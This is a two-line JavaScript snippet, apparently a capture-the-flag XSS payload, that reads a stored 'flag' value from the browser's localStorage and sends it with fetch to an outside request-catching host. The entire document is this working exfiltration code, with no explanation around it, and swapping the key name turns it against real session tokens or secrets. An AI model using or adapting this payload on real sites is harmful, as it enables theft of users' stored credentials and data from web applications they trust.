const flag = localStorage.getItem("flag");
fetch("https://ctf-test.free.beeceptor.com?flag=" + encodeURIComponent(flag));
